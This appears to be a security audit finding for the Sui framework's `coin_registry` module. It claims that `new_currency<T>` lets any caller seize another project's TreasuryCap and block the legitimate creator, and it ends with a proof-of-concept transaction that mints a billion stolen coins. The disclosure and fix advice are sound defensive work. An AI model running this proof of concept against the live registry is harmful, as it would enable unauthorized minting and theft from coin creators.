### Title
Unprivileged caller can pre-register any `key`-typed coin in `CoinRegistry`, seizing `TreasuryCap<T>` and permanently blocking the legitimate creator — (`File: crates/sui-framework/packages/sui-framework/sources/registries/coin_registry.move`)

---

### Summary

`coin_registry::new_currency<T>` is a `public` function with no access control on the type parameter `T`. Any ordinary SUI holder can call it with a coin type defined in another module, claim the `CurrencyKey<T>` derived-address slot in the singleton `CoinRegistry` at `0xc`, and receive a fully functional `TreasuryCap<T>` — the exclusive minting authority for that coin. The legitimate coin creator's subsequent call to `new_currency<T>` aborts with `ECurrencyAlreadyExists`, permanently locking them out of their own currency.

---

### Finding Description

`new_currency` is declared `public` and its only type constraint is `T: key`:

```move
public fun new_currency<T: /* internal */ key>(
    registry: &mut CoinRegistry,
    ...
): (CurrencyInitializer<T>, TreasuryCap<T>) {
    assert!(!registry.exists<T>(), ECurrencyAlreadyExists);   // ← uniqueness gate
    let treasury_cap = coin::new_treasury_cap(ctx);           // ← no witness required
    let currency = Currency<T> {
        id: derived_object::claim(&mut registry.id, CurrencyKey<T>()), // ← slot claimed
        ...
    };
    (CurrencyInitializer { currency, is_otw: false, ... }, treasury_cap)
}
``` [1](#0-0) 

The `/* internal */` annotation is a plain comment — Move has no mechanism to restrict a generic function to callers whose module defines `T`. Any address can supply any `T: key` type, including one published by a third party.

`coin::new_treasury_cap` is `public(package)` and is called inside `new_currency` (same package), so the attacker receives a real `TreasuryCap<T>` backed by `balance::create_supply_internal()` — no one-time-witness required: [2](#0-1) 

Once `new_currency<T>` succeeds, `derived_object::claim` marks `CurrencyKey<T>` as `Reserved` in the registry's UID: [3](#0-2) 

The `exists<T>` check in `new_currency` reads the same slot: [4](#0-3) 

Because `ClaimedStatus::Reserved` is permanent and `derived_object` provides no reclaim path, the slot is irrecoverably occupied: [5](#0-4) 

The `CurrencyInitializer<T>` hot-potato returned by `new_currency` has no `drop`, so the attacker must call `finalize` in the same PTB, which shares the attacker-controlled `Currency<T>` object: [6](#0-5) 

---

### Impact Explanation

After the attack:

1. **Unauthorized minting**: The attacker holds `TreasuryCap<T>` and can call `treasury_cap.mint(amount, ctx)` to create arbitrary `Coin<T>` objects. `Supply<T>` is `{ value: u64 }` with no witness guard on `increase_supply`, so the cap is fully functional.
2. **Permanent denial of registration**: The legitimate creator's call to `new_currency<T>` aborts at `assert!(!registry.exists<T>(), ECurrencyAlreadyExists)`. There is no admin override or reclaim path.
3. **Metadata cap seizure**: The attacker also receives `MetadataCap<T>` from `finalize`, controlling the coin's name, symbol, and description.

This is unauthorized object creation leading to direct fund theft (minting) and permanent state corruption — matching the Critical impact tier.

---

### Likelihood Explanation

- The `CoinRegistry` at `0xc` is a live shared object on mainnet; `new_currency` is callable in any PTB.
- The only precondition is knowing a coin type `T` with `key` ability before its creator calls `new_currency<T>`. Because package publication is public and coin types are visible on-chain immediately after publish, an attacker can monitor the mempool or simply scan published packages.
- No privileged keys, governance access, or special capabilities are required — a standard SUI wallet suffices.
- The attack is a single PTB: `new_currency<VictimType>(registry, ...) → finalize(builder, ctx)`.

---

### Recommendation

**Short term**: Add a module-origin check. Move 2024 does not have a built-in "caller's module must define `T`" constraint, but the same effect can be achieved by requiring a witness value of type `T` (which only the defining module can construct) as a parameter — analogous to the OTW pattern already used in `new_currency_with_otw`:

```move
public fun new_currency<T: key + drop>(
    _witness: T,          // only the module defining T can produce this
    registry: &mut CoinRegistry,
    ...
)
```

Alternatively, gate the function with `public(package)` and expose it only through a framework-controlled entry point that verifies the caller's package ID matches the package that defines `T`.

**Long term**: Audit all `public fun` generic functions in the `sui` framework that accept `T: key` without a witness, and enforce module-origin invariants consistently across the registry surface.

---

### Proof of Concept

Assume Alice has published a package at `0xALICE` containing:

```move
module alice::my_coin;
public struct MY_COIN has key { id: UID }
```

Eve (attacker) submits the following PTB before Alice calls `new_currency`:

```move
// PTB submitted by Eve
let registry: &mut CoinRegistry = @0xc;

// Step 1: claim CurrencyKey<alice::my_coin::MY_COIN> and receive TreasuryCap
let (builder, treasury_cap) =
    coin_registry::new_currency<alice::my_coin::MY_COIN>(
        registry,
        6,
        b"MYCOIN".to_string(),
        b"My Coin".to_string(),
        b"".to_string(),
        b"".to_string(),
        ctx,
    );

// Step 2: consume hot potato, share Currency<MY_COIN>
let metadata_cap = coin_registry::finalize(builder, ctx);

// Step 3: mint 1 billion MY_COIN to Eve
let minted = treasury_cap.mint(1_000_000_000_000_000, ctx);
transfer::public_transfer(minted, @EVE);
transfer::public_transfer(treasury_cap, @EVE);
transfer::public_transfer(metadata_cap, @EVE);
```

**Result**:
- Eve holds `TreasuryCap<MY_COIN>` and can mint unboundedly.
- Alice's call to `new_currency<MY_COIN>` aborts with `ECurrencyAlreadyExists`.
- The `CurrencyKey<MY_COIN>` slot in `CoinRegistry` is permanently reserved.
